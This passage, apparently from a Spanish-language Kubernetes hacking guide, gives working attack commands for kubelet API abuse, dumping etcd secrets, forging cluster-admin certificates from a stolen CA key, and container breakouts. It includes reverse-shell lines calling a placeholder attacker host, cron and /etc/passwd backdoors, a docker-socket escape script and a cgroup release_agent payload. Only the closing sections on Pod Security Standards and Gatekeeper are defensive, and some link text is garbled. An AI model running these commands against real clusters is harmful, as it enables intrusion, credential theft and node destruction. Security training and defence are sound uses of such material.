# Probar con el token del SA
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k https://<NODE_IP>:10250/pods -H "Authorization: Bearer $TOKEN"
```

**Autorización del kubelet**:

El kubelet tiene dos modos:
- `--authorization-mode=AlwaysAllow`: cualquiera autenticado tiene FULL ACCESS (peligroso)
- `--authorization-mode=Webhook`: delega al API Server (más seguro)

```bash
# Verificar modo de autorización
curl -k https://<NODE_IP>:10250/configz | jq '.kubeletconfig.authorization'
```

Si es `AlwaysAllow`, cualquier token que tengamos (incluso el default) nos da control total sobre el kubelet.

### 4.3 [pod](../raw/k8s-d33p-d1v3.md#pods) Listing y Enumeración

Una vez con acceso al kubelet, el endpoint más útil para enumeración es `/pods`:

```bash
# Listar todos los pods en el nodo
curl -sk https://<NODE_IP>:10250/pods | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace, containers: [.spec.containers[].name], images: [.spec.containers[].image]}'

# Obtener información más detallada
curl -sk https://<NODE_IP>:10250/pods | jq '.items[] | select(.metadata.namespace == "kube-system") | .metadata.name'

# Obtener los contenedores con sus IDs
curl -sk https://<NODE_IP>:10250/runningpods | jq '.items[].status.containerStatuses[] | {name, containerID, image}'
```

**Información obtenida**:
- Nombres de Pods y sus namespaces
- Imágenes de contenedores
- Mounts y volúmenes
- Environment variables
- Resource requests/limits
- Node selector y afinidades

### 4.4 Exec Into Containers via Kubelet

El endpoint `/exec` del kubelet permite ejecutar comandos en cualquier [contenedor](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) del nodo, **si estamos autorizados**.

```bash
# Endpoint structure (simplified):
# POST https://<NODE_IP>:10250/exec/<namespace>/<pod>/<container>?command=<cmd>&input=1&output=1&tty=1

# Usando kubectl (si tenemos acceso al cluster)
kubectl exec -it <pod> -n <namespace> -- sh

# Directo al kubelet con curl (WebSocket upgrade)
# Es más complejo porque usa SPDY/WebSocket
```

**Herramienta: kubeletctl** (herramienta especializada):

```bash
# Descargar kubeletctl
wget https://github.com/cyberark/kubeletctl/releases/latest/download/kubeletctl_linux_amd64 -O kubeletctl
chmod +x kubeletctl

# Escanear nodos
./kubeletctl scan -s <NODE_IP> --cidr 10.0.0.0/24

# Listar pods
./kubeletctl pods -s <NODE_IP>

# Ejecutar comando interactivo
./kubeletctl exec "id" -s <NODE_IP> -p <pod> -c <container> -n <namespace>

# Ejecutar shell interactiva
./kubeletctl exec "/bin/sh" -s <NODE_IP> -p <pod> -c <container> -n <namespace>

# Port forwarding via kubelet
./kubeletctl port-forward -s <NODE_IP> -p <pod> -n <namespace> 8080:80
```

**El problema de exec via kubelet**: Si `authorization-mode=Webhook`, el kubelet le pregunta al API Server "¿puede este token ejecutar 'pods/exec'?".

Pero con `AlwaysAllow`, es un `exec` sin restricciones.

### 4.5 Endpoints /pods y /runningpods

Diferencias entre los endpoints:

**`/pods`**:
- Devuelve TODOS los pods que el kubelet conoce (incluyendo terminados)
- Más información (spec, status, metadata)
- Equivalente a `kubectl get pods -o yaml`

**`/runningpods`**:
- Solo pods en ejecución
- Información más limitada
- Más rápido de obtener

```bash
# Obtener todos los pods
curl -sk https://<NODE_IP>:10250/pods | jq '.items | length'

# Obtener solo IPs de pods
curl -sk https://<NODE_IP>:10250/pods | jq '.items[].status.podIP'

# Obtener namespaces únicos
curl -sk https://<NODE_IP>:10250/pods | jq '[.items[].metadata.namespace] | unique'
```

### 4.6 Kubelet Port Forwarding

El kubelet también permite port forwarding, que sirve para acceder a servicios internos sin exponerlos via Service.

```bash
# Usando kubectl
kubectl port-forward pod/mi-pod 8080:80

# Directo al kubelet (kubeletctl)
./kubeletctl port-forward -s <NODE_IP> -p <pod> -n <namespace> 8888:6379

# Esto expone el puerto 6379 (Redis) del Pod en nuestro localhost:8888
```

**Ataque**: Port forward a servicios internos:
- Bases de datos (Redis, MySQL, PostgreSQL)
- Message brokers (Kafka, RabbitMQ)
- Debug endpoints (pprof, heap dumps)
- Sidecars de service mesh (Envoy admin)

### 4.7 Abuso de Kubelet Config

El endpoint `/configz` del kubelet expone su configuración completa:

```bash
# Obtener la configuración del kubelet
curl -sk https://<NODE_IP>:10250/configz | jq '.kubeletconfig'

# Ver la CA del cluster (útil para crear certs)
curl -sk https://<NODE_IP>:10250/configz | jq '.kubeletconfig.authentication.x509.clientCAFile'

# Ver dónde están los certificados
curl -sk https://<NODE_IP>:10250/configz | jq '.kubeletconfig.tlsCertFile, .kubeletconfig.tlsKeyFile'
```

**Configuración peligrosa que podemos detectar**:

```json
{
  "kubeletconfig": {
    "authentication": {
      "anonymous": {
        "enabled": true  // ← Anonymous auth!
      },
      "webhook": {
        "enabled": false  // ← No webhook auth
      }
    },
    "authorization": {
      "mode": "AlwaysAllow"  // ← Si no usa Webhook
    },
    "readOnlyPort": 10255,  // ← Puerto read-only abierto
    "protectKernelDefaults": false,
    "seccompDefault": false
  }
}
```

Si `authentication.anonymous.enabled: true` y `authorization.mode: AlwaysAllow`, tenemos acceso TOTAL al kubelet sin token.

---

## 5. etcd Exploitation

etcd es la joya de la corona. Si llegamos a etcd, tenemos TODO el [cluster](../raw/k8s-d33p-d1v3.md#cluster)-d33p-d1v3.md#[cluster](../raw/k8s-d33p-d1v3.md#cluster)).

### 5.1 Direct Database Access

etcd escucha en el [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 2379 (cliente) y 2380 (peer). En clusters mal configurados, puede estar expuesto sin [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls).

```bash
# Verificar si etcd está expuesto
curl http://<ETCD_IP>:2379/version
curl -k https://<ETCD_IP>:2379/version

# Con TLS (certificados necesarios)
curl --cert /path/to/etcd-client.crt --key /path/to/etcd-client.key \
  https://<ETCD_IP>:2379/version
```

**Usando etcdctl**:

```bash
# etcdctl local
etcdctl --endpoints=http://localhost:2379 get / --prefix --keys-only

# etcdctl con certificados
etcdctl --endpoints=https://<ETCD_IP>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only
```

### 5.2 Key Enumeration

Una vez conectados a etcd, lo primero es entender la estructura de keys:

```bash
# Listar todas las keys
etcdctl get / --prefix --keys-only

# Filtrar por tipo de recurso
etcdctl get /registry/secrets --prefix --keys-only
etcdctl get /registry/pods --prefix --keys-only
etcdctl get /registry/deployments --prefix --keys-only
etcdctl get /registry/configmaps --prefix --keys-only
etcdctl get /registry/nodes --prefix --keys-only
etcdctl get /registry/serviceaccounts --prefix --keys-only
etcdctl get /registry/roles --prefix --keys-only
etcdctl get /registry/rolebindings --prefix --keys-only
etcdctl get /registry/clusterroles --prefix --keys-only
etcdctl get /registry/clusterrolebindings --prefix --keys-only
```

**Estructura de keys típica**:

```
/registry/secrets/<namespace>/<secret-name>
/registry/configmaps/<namespace>/<configmap-name>
/registry/pods/<namespace>/<pod-name>
/registry/deployments/<namespace>/<deployment-name>
/registry/serviceaccounts/<namespace>/<sa-name>
/registry/nodes/<node-name>
```

### 5.3 Secret Extraction

Esta es la parte más jugosa. Todos los Secrets de [kubernetes](../raw/k8s-d33p-d1v3.md) están en etcd, codificados en base64 (no encriptados por defecto).

```bash
# Listar todos los secrets
etcdctl get /registry/secrets --prefix --keys-only

# Obtener un secret específico (en formato etcd)
etcdctl get /registry/secrets/default/mi-secret

# Extraer todos los secrets de forma masiva
for key in $(etcdctl get /registry/secrets --prefix --keys-only); do
  echo "=== $key ==="
  etcdctl get "$key"
  echo
done | tee secrets.txt
```

**Decodificar los valores**:

```bash
# El valor en etcd está serializado como protobuf
# Pero podemos usar un script para parsearlo

# Usar kubectl para decodificar (si tenemos un kubeconfig válido)
# No podemos usar kubectl directo porque no tenemos API Server

# Parsear con python (necesita pip install python-etcd3 o similar)
python3 << 'EOF'
import etcd3
import base64
import json

etcd = etcd3.client(host='localhost', port=2379)
for value, metadata in etcd.get_prefix('/registry/secrets'):
    print(f"Key: {metadata.key.decode()}")
    # El valor es un protobuf de Kubernetes, necesitamos deserializarlo
    # Esto es complejo, mejor usar etcdctl y volcar a JSON
    print(value[:500])
    print("---")
EOF
```

**Alternativa**: Volcar etcd completo y parsear offline.

```bash
# Volcar todo etcd a un archivo
etcdctl get / --prefix --print-value-only > etcd_dump.txt

# O mejor, snapshot
etcdctl snapshot save etcd.snapshot
```

### 5.4 Certificate Theft

Los certificados TLS del cluster están almacenados como Secrets en etcd, o en archivos del nodo.

**Certificados en etcd** (si están como Secret):

```bash
# Buscar certificados en secrets
etcdctl get /registry/secrets --prefix --keys-only | grep -i cert
etcdctl get /registry/secrets --prefix --keys-only | grep -i tls
etcdctl get /registry/secrets --prefix --keys-only | grep -i ca
```

**Certificados en el filesystem** (si tenemos acceso al nodo):

```bash
# Ubicaciones comunes de certificados
/etc/kubernetes/pki/
  ├── apiserver.crt
  ├── apiserver.key
  ├── apiserver-kubelet-client.crt
  ├── apiserver-kubelet-client.key
  ├── ca.crt
  ├── ca.key          ← LA CLAVE MÁS IMPORTANTE
  ├── front-proxy-ca.crt
  ├── front-proxy-ca.key
  ├── front-proxy-client.crt
  ├── front-proxy-client.key
  ├── etcd/
  │   ├── ca.crt
  │   ├── ca.key
  │   ├── healthcheck-client.crt
  │   ├── healthcheck-client.key
  │   ├── peer.crt
  │   ├── peer.key
  │   ├── server.crt
  │   └── server.key
  └── sa.key
  └── sa.pub
```

**¿Qué podemos hacer con la CA key (`ca.key`)?**:
- Firmar NUEVOS certificados para cualquier usuario
- Crear certificados de kubelet para cualquier nodo
- Acceder al API Server como cualquier usuario

```bash
# Con la CA, crear un certificado para cluster-admin
openssl genrsa -out hacker.key 2048
openssl req -new -key hacker.key -out hacker.csr -subj "/CN=hacker/O=system:masters"
openssl x509 -req -in hacker.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out hacker.crt -days 365

# Usar el certificado
kubectl --client-certificate=hacker.crt --client-key=hacker.key get secrets --all-namespaces
```

### 5.5 etcd Snapshot Extraction

Los snapshots de etcd contienen TODO el estado del cluster:

```bash
# Crear snapshot
ETCDCTL_API=3 etcdctl snapshot save snapshot.db

# Ver el snapshot (necesita etcd para restaurar)
# Opción 1: restaurar localmente
ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \
  --data-dir ./restored-etcd

# Luego correr etcd temporal
etcd --data-dir=./restored-etcd --listen-client-urls=http://localhost:4001 \
  --advertise-client-urls=http://localhost:4001 &

# Acceder al etcd restaurado
etcdctl --endpoints=http://localhost:4001 get / --prefix --keys-only

# Opción 2: dump directo del snapshot a JSON (con tools custom)
# etcd-dump
```

**Protección contra snapshot theft**:
- En [k8s](../raw/k8s-d33p-d1v3.md) 1.24+, los Secrets se pueden encriptar en reposo en etcd (EncryptionConfiguration)
- Los snapshots deberían estar protegidos con RBAC
- etcd debería correr solo en el control plane, aislado

### 5.6 etcd sin TLS/anonymous access

La configuración más insegura posible de etcd:

```yaml
# /etc/etcd/etcd.config.yaml
listen-client-urls: http://0.0.0.0:2379  # ← Escucha en todas las interfaces!
advertise-client-urls: http://<IP>:2379
client-transport-security: {}  # ← Sin TLS!
```

O peor aún, etcd corriendo en su propio [pod](../raw/k8s-d33p-d1v3.md#pods) con acceso desde cualquier lugar.

```bash
# Encontrar etcd expuesto en la red
nmap -p 2379 <CIDR> --open

# También buscar puerto 2380 (peer)
nmap -p 2380 <CIDR> --open
```

**¿Qué podemos hacer si encontramos etcd sin auth?**
1. Leer TODOS los secrets del cluster
2. Extraer service account tokens
3. Obtener certificados de la CA
4. Crear nuevos recursos maliciosos
5. Modificar deployments existentes
6. Borrar todo el estado (ransomware)

```bash
# Ejemplo: crear un deployment malicioso
# Esto requiere escribir en etcd, que es más complejo
# porque los datos están serializados como protobuf de K8s

# Pero podemos modificar el ReplicaSet de un deployment existente
# para que ejecute un container atacante
```

---

## 6. [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) Breakouts

Un breakout es cuando escapamos del container al host. En [kubernetes](../raw/k8s-d33p-d1v3.md)-d33p-d1v3.md), esto nos da acceso al nodo worker, y desde ahí podemos pivotear al resto del [cluster](../raw/k8s-d33p-d1v3.md#cluster).

### 6.1 Privileged Container

Un container privilegiado es esencialmente un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) con todos los [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities) y sin restricciones de cgroups/namespaces.

**¿Cómo se ve un [pod](../raw/k8s-d33p-d1v3.md#pods) privilegiado?**:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: privileged
    image: ubuntu:latest
    securityContext:
      privileged: true  # ← Esto es el problema
    command: ["sleep", "3600"]
```

**Detectar Pods privilegiados**:

```bash
# Desde kubectl
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.containers[*].securityContext.privileged}{"\n"}{end}'

# Desde el nodo
docker inspect <container_id> | jq '.[].HostConfig.Privileged'
```

**Breakout desde privileged container**:

```bash
# Una vez dentro del container privilegiado:

# 1. Tenemos acceso completo a /dev
ls -la /dev/

# 2. Podemos montar el disco del host
fdisk -l
mkdir /mnt-host
mount /dev/sda1 /mnt-host
ls /mnt-host/

# 3. Podemos instalar Docker y correr containers
apt-get update && apt-get install -y docker.io
docker run -it --privileged --pid=host ubuntu bash

# 4. Acceso a /proc del host
# Ver las tareas del host
ls /proc/1/root/

# 5. Escribir cron job en el host
echo "* * * * * root nc <atacante> 4444 -e /bin/bash" > /mnt-host/etc/cron.d/backdoor
```

**El [payload](../raw/m3t4spl01t.md#payloads) clásico de breakout**:

```bash
# nsenter: entrar al namespace del host
# Instalar nsenter (viene en util-linux)
apt-get update && apt-get install -y util-linux

# Entrar al namespace del host
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Ya estamos en el host!
hostname
cat /etc/shadow
```

O más elegante:

```bash
chroot /host bash
# Donde /host es el mount del filesystem raíz del host
```

### 6.2 hostPID Abuse

Compartir el PID namespace del host permite ver todos los procesos del nodo.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpid-pod
spec:
  hostPID: true  # ← Comparte PID namespace
  containers:
  - name: hostpid
    image: ubuntu:latest
    command: ["sleep", "3600"]
```

**Desde adentro**:

```bash
# Podemos ver los procesos del host
ps aux  # ¡Todos los procesos del host visibles!

# Podemos ver las variables de entorno de otros procesos
cat /proc/1/environ | tr '\0' '\n'

# Podemos inyectar código en procesos del host
# Por ejemplo, en kubelet
cat /proc/$(pgrep kubelet)/environ

# Podemos acceder a los file descriptors de otros procesos
ls -la /proc/1/fd/
cat /proc/1/fd/1  # stdout del PID 1 (logs)
```

**Técnica de inyección con ptrace**:

```bash
# Si tenemos CAP_SYS_PTRACE (privilegiado + hostPID)
apt-get install -y gdb

# Attach a un proceso del host
gdb -p <PID>
(gdb) call system("nc <atacante> 4444 -e /bin/bash")
(gdb) detach
```

### 6.3 hostNetwork Abuse

Compartir la [red](../raw/r3d3s-f0nd4m3nt0s.md) del host significa que el container ve las interfaces de [red](../raw/r3d3s-f0nd4m3nt0s.md) del nodo.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostnetwork-pod
spec:
  hostNetwork: true  # ← Usa la red del host
  containers:
  - name: hostnetwork
    image: ubuntu:latest
    command: ["sleep", "3600"]
```

**Desde adentro**:

```bash
# Ver interfaces del host
ip addr
ip link
ip route

# Ver reglas de iptables del host
iptables -L -n -v
iptables -t nat -L -n -v

# Sniffear tráfico de la red del host
apt-get update && apt-get install -y tcpdump
tcpdump -i any -w capture.pcap

# Escanear puertos del host
apt-get install -y nmap
nmap -sT -p- 127.0.0.1  # Escanea el localhost del HOST

# Acceder a servicios que escuchan solo en localhost
curl http://localhost:10250/pods  # Kubelet
curl http://localhost:2379/version  # etcd (si está en localhost)
```

**Ataques específicos con hostNetwork**:

1. **[cloud](../raw/cl0ud-h4ck1ng.md) metadata service**: En clouds ([aws](../raw/cl0ud-h4ck1ng.md#aws), [gcp](../raw/cl0ud-h4ck1ng.md#gcp), [azure](../raw/cl0ud-h4ck1ng.md#azure)), la metadata está en 169.254.169.254
2. **[dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) poisoning**: podemos ver/modificar tráfico [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns)
3. **Bypass NetworkPolicies**: las policies no aplican al tráfico del host
4. **[arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing)**: podemos interceptar tráfico de otros Pods en el mismo nodo

### 6.4 hostPath Volume Mounts

hostPath mounts permiten montar directorios del host dentro del container.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-pod
spec:
  containers:
  - name: hostpath
    image: ubuntu:latest
    volumeMounts:
    - name: host-root
      mountPath: /host
    command: ["sleep", "3600"]
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

**Mounts peligrosos específicos**:

| hostPath | Qué podemos hacer |
|---|---|
| `/` | Acceso completo al filesystem del host |
| `/var/run/docker.sock` | [docker](../raw/d0ck3r-f0r-h4ck3rs.md)-in-[docker](../raw/d0ck3r-f0r-h4ck3rs.md) breakout |
| `/proc` | Acceso a procesos del host, modificar `/proc/sys/...` |
| `/sys` | Modificar parámetros del [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) |
| `/dev` | Acceso a dispositivos del host |
| `/etc/kubernetes` | Acceso a certificados y configs de [k8s](../raw/k8s-d33p-d1v3.md) |
| `/var/lib/kubelet` | Acceso a kubelet config, pods, volumes |
| `/var/log` | Logs del sistema |
| `/root/.ssh` | Claves SSH del root del host |

**Breakout con hostPath**:

```bash
# Desde el container con / montado en /host

# 1. Leer secretos del host
cat /host/etc/shadow
cat /host/root/.ssh/id_rsa

# 2. Escribir persistencia
echo "hacker:*:0:0::/root:/bin/bash" >> /host/etc/passwd
mkdir -p /host/root/.ssh
echo "ssh-rsa AAA..." >> /host/root/.ssh/authorized_keys

# 3. Chroot al host
chroot /host /bin/bash

# 4. Modificar configuración del kubelet
# /host/var/lib/kubelet/config.yaml
# /host/etc/kubernetes/

# 5. Extraer certificados
cat /host/etc/kubernetes/pki/ca.key
```

### 6.5 Capabilities Abuse

Linux capabilities son [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) individuales que puede tener un proceso. Docker/K8s asigna un conjunto por defecto, pero se pueden agregar más.

**Capabilities peligrosas**:

| Capability | Riesgo |
|---|---|
| `CAP_SYS_ADMIN` | Prácticamente root. Mount, namespace, etc. |
| `CAP_NET_ADMIN` | Modificar interfaces de red, iptables |
| `CAP_SYS_PTRACE` | ptrace a otros procesos |
| `CAP_SYS_MODULE` | Cargar módulos del kernel |
| `CAP_DAC_OVERRIDE` | Bypassear permisos de archivos |
| `CAP_CHOWN` | Cambiar owner de archivos |
| `CAP_FOWNER` | Bypassear permisos de owner |
| `CAP_SETUID` | Cambiar UID/GID |
| `CAP_NET_RAW` | Crear raw sockets (sniffing) |
| `CAP_SYS_RAWIO` | Acceso a puertos de I/O, /dev/mem |
| `CAP_KILL` | Enviar señales a cualquier proceso |
| `CAP_SYS_BOOT` | Reboot del sistema |
| `CAP_SYS_TIME` | Cambiar el reloj del sistema |

**Ver capabilities del container**:

```bash
# Desde adentro del container
cat /proc/1/status | grep Cap
# CapInh: 00000000a80425fb
# CapPrm: 00000000a80425fb
# CapEff: 00000000a80425fb
# CapBnd: 00000000a80425fb

# Decodificar capabilities
capsh --decode=00000000a80425fb

# O usar getpcaps
getpcaps 1
```

**YAML con capabilities extras**:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: cap-pod
spec:
  containers:
  - name: cap-pod
    image: ubuntu:latest
    securityContext:
      capabilities:
        add:
        - SYS_ADMIN
        - NET_ADMIN
        - SYS_PTRACE
    command: ["sleep", "3600"]
```

**Explotación de cada capability**:

**CAP_SYS_ADMIN**:

```bash
# Mount del host
mkdir /tmp/cgroup && mount -t cgroup -o memory cgroup /tmp/cgroup

# Crear cgroup para escape
mkdir /tmp/cgroup/x
echo 1 > /tmp/cgroup/x/notify_on_release
echo "$(cat /tmp/cgroup/release_agent)" > /tmp/cgroup/release_agent
# Luego trigger con echo $$ > /tmp/cgroup/x/tasks
```

**CAP_NET_ADMIN + CAP_NET_RAW**:

```bash
# Sniffear tráfico
tcpdump -i any

# Modificar iptables
iptables -A OUTPUT -j DROP

# Crear interfaces virtuales
ip link add dummy0 type dummy
```

**CAP_SYS_PTRACE**:

```bash
# Inyectar en procesos del host (si también tenemos hostPID)
gdb -p <PID>

# Leer memoria de procesos
cat /proc/<PID>/mem
```

**CAP_SYS_MODULE**:

```bash
# Cargar módulo kernel malicioso
insmod /path/to/evil.ko

# El módulo puede hacer cualquier cosa en el kernel
```

**CAP_DAC_OVERRIDE**:

```bash
# Leer cualquier archivo sin restricciones de permisos
cat /root/.ssh/id_rsa  # No importa que sea 600
```

### 6.6 Docker Socket Mounting (Docker-in-Docker)

Montar el socket de Docker dentro del container da control total sobre el daemon de Docker del host.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: docker-sock-pod
spec:
  containers:
  - name: docker-sock
    image: ubuntu:latest
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
    command: ["sleep", "3600"]
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
```

**Explotación**:

```bash
# Instalar Docker CLI
apt-get update && apt-get install -y docker.io

# Listar containers en el HOST
docker -H unix:///var/run/docker.sock ps

# Correr un container privilegiado en el HOST
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host ubuntu bash

# O mejor: montar el root del host
docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu chroot /host bash

# Extaer imágenes
docker -H unix:///var/run/docker.sock save -o images.tar <image>

# Matar procesos del host
docker -H unix:///var/run/docker.sock rm -f $(docker -H unix:///var/run/docker.sock ps -aq)
```

**Script de breakout automático**:

```bash
#!/bin/bash
# docker-sock-breakout.sh

if [ -S /var/run/docker.sock ]; then
    echo "[*] Docker socket encontrado!"
    
    # Verificar que Docker CLI existe
    if ! command -v docker &> /dev/null; then
        echo "[*] Instalando Docker CLI..."
        apt-get update -qq && apt-get install -y -qq docker.io
    fi
    
    # Correr container con mount del host
    echo "[*] Creando container de escape..."
    docker run -d --name escape -v /:/host --privileged ubuntu:latest \
      chroot /host bash -c "echo 'atacante:*:0:0:root:/root:/bin/bash' >> /etc/passwd && echo 'escape exitoso'" 2>/dev/null
    
    echo "[*] Verificando..."
    docker logs escape 2>/dev/null
else
    echo "[-] No hay Docker socket"
fi
```

### 6.7 Breakout via cgroups

Los cgroups (control groups) limitan recursos, pero también pueden usarse para escapar.

**Técnica: release_agent + cgroup write**:

```bash
# Solo funciona en containers con --privileged o CAP_SYS_ADMIN

# Montar cgroup
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp

# Crear sub-cgroup
mkdir /tmp/cgrp/x

# Configurar release_agent
echo 1 > /tmp/cgrp/x/notify_on_release

# Obtener la ruta del release_agent
HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /proc/mounts)

# Configurar release_agent para ejecutar nuestro payload
echo "$HOST_PATH/payload.sh" > /tmp/cgrp/release_agent

# Crear payload
cat > /tmp/payload.sh << 'EOF'
#!/bin/bash
echo "atacante:\$6\$...:0:0:root:/root:/bin/bash" >> /etc/passwd
EOF
chmod +x /tmp/payload.sh

# Trigger
echo $$ > /tmp/cgrp/x/tasks
```

**Explicación**:
1. Montamos cgroup dentro del container
2. Creamos un sub-cgroup y configuramos notify_on_release
3. El release_agent se ejecuta en el HOST cuando el cgroup queda vacío
4. Apuntamos release_agent a un script en nuestro container
5. Movemos nuestro PID al cgroup y luego lo terminamos
6. El release_agent se ejecuta en el namespace del host

### 6.8 Breakout via /proc/sysrq-trigger

El archivo `/proc/sysrq-trigger` permite ejecutar comandos mágicos del kernel si tenemos acceso de escritura.

```bash
# Verificar permisos
ls -la /proc/sysrq-trigger

# Si es escribible (por privilegios o capabilities):
# Reboot instantáneo
echo b > /proc/sysrq-trigger

# Sincronizar discos
echo s > /proc/sysrq-trigger

# Remount read-only
echo u > /proc/sysrq-trigger

# Listar tareas en consola
echo t > /proc/sysrq-trigger

# Simular OOM killer
echo f > /proc/sysrq-trigger
```

**Combinado con hostPath**:

```yaml
# Montar /proc desde el host
volumes:
- name: proc
  hostPath:
    path: /proc
```

```bash
# Dentro del container
echo b > /proc/sysrq-trigger  # Reboot del nodo!
```

### 6.9 Breakout via Container Runtime [cve](../raw/s3c-f0nd4m3nt0s.md#cve)

Las vulnerabilidades en los container runtimes son goldmines. Algunas históricas:

**CVE-2019-5736 (runc breakout)**:
- Permite overwrite del binario runc en el host
- Requiere capacidad de exec en container (priviliged o ciertos capabilities)

```bash
# Payload malicioso que overwritea runc
# Compilar en Go:
cat > main.go << 'GOEOF'
package main

import (
    "io/ioutil"
    "os"
    "os/exec"
)

func main() {
    // Esperar a que el atacante ejecute docker exec
    // Reemplazar /usr/bin/runc con nuestro payload
    payload := "#!/bin/bash\nbash -i >& /dev/tcp/atacante/4444 0>&1"
    ioutil.WriteFile("/usr/bin/runc", []byte(payload), 0755)
    os.Exit(0)
}
GOEOF
```

**CVE-2024-21626 (runc leak)**:
- File descriptor leak en runc 1.1.11 y anteriores
- Permite acceder al filesystem del host

```bash
# Explotación
# Desde dentro del container:
ls -la /proc/self/fd/
cat /proc/self/fd/8/etc/shadow  # FD leak al host
```

**CVE-2022-0492 (cgroup v1)**:
- Release_agent escape sin privilegios (en kernels viejos)

### 6.10 Abuso de user namespace mappings

Linux user namespaces permiten mapear un UID privilegiado dentro del container a un UID no privilegiado fuera.

**Si el container se creó con `--userns=host`** (que es el default en Kubernetes), no hay user namespace isolation.

**Si hay user namespaces habilitados**:

```yaml
# En Kubernetes 1.25+, se puede habilitar User Namespaces
# Pero NO es común todavía
spec:
  hostUsers: false
```

**Ataque**: Si un container tiene `CAP_SYS_ADMIN` y user namespaces activos:

```bash
# Podemos crear nuevos user namespaces
unshare -U -r /bin/bash
# Dentro somos root... pero solo en el namespace

# Sin embargo, si tenemos mount + user namespace:
unshare -U -m /bin/bash
mount -t tmpfs tmpfs /tmp  # Funciona!
```

---

## 7. [pod](../raw/k8s-d33p-d1v3.md#pods) Security

### 7.1 Pod Security Standards (PSS)

[kubernetes](../raw/k8s-d33p-d1v3.md)-d33p-d1v3.md) define tres niveles de seguridad para Pods:

| Nivel | Descripción |
|---|---|
| **Privileged** | Sin restricciones. Para system pods. |
| **Baseline** | Restricciones mínimas pero seguridad básica |
| **Restricted** | Máxima seguridad. Sigue buenas prácticas. |

**Privileged** permite:
- `privileged: true`
- Todos los [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities)
- hostPID, hostIPC, hostNetwork
- hostPath volumes
- Cualquier usuario

**Baseline** prohíbe:
- `privileged: true`
- `hostPID`, `hostIPC`, `hostNetwork`
- HostPort
- `AllowPrivilegeEscalation: true`
- Capabilities like `SYS_ADMIN`, `NET_ADMIN`, `SYS_PTRACE`, etc.
- `seccomp: Unconfined`
- AppArmor perfil no-default

**Restricted** (además de Baseline):
- `runAsNonRoot: true`
- `seccomp: RuntimeDefault` o mejor
- readOnlyRootFilesystem
- `capabilities.drop: ["ALL"]`
- `allowPrivilegeEscalation: false`

**Verificar el nivel de un Pod**:

```bash
# Pod Security Standards checker
kubectl get pods --all-namespaces -o json | jq '.items[] | {
  name: .metadata.name,
  ns: .metadata.namespace,
  privileged: .spec.containers[].securityContext.privileged,
  hostPID: .spec.hostPID,
  hostNetwork: .spec.hostNetwork,
  hostIPC: .spec.hostIPC,
  runAsNonRoot: .spec.containers[].securityContext.runAsNonRoot
}'
```

### 7.2 Pod Security Admission (PSA)

**Pod Security Admission** reemplaza a **PodSecurityPolicy** (deprecado en [k8s](../raw/k8s-d33p-d1v3.md) 1.21, eliminado en 1.25).

**Modos de PSA**:

| Modo | Comportamiento |
|---|---|
| `enforce` | Rechaza Pods que violan la policy |
| `audit` | Registra violaciones en audit log |
| `warn` | Muestra warning al usuario |

**Labels de namespace para PSA**:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: baseline
    pod-security.kubernetes.io/warn: baseline
```

**Verificar PSA**:

```bash
# Ver niveles de seguridad por namespace
kubectl get ns -o yaml | grep -A5 pod-security

# Probar si un YAML pasaría PSA
kubectl apply --dry-run=server -f pod.yaml
```

### 7.3 OPA Gatekeeper

**Open Policy Agent (OPA) Gatekeeper** es un admission controller que permite policies personalizadas usando Rego.

**Instalación**:

```bash
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.12/deploy/gatekeeper.yaml
```

**ConstraintTemplate de ejemplo**:

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        openAPIV3Schema:
          type: object
          properties:
            labels:
              type: array
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredlabels
        violation[{"msg": msg}] {
          provided := {label | input.review.object.metadata.labels[label]}
          required := {label | label := input.parameters.labels[_]}
          missing := required - provided
          count(missing) > 0
          msg := sprintf("Faltan labels: %v", [missing])
        }
```

**Constraint**:

```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: ns-must-have-owner
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Namespace"]
  parameters:
    labels: ["owner"]
```

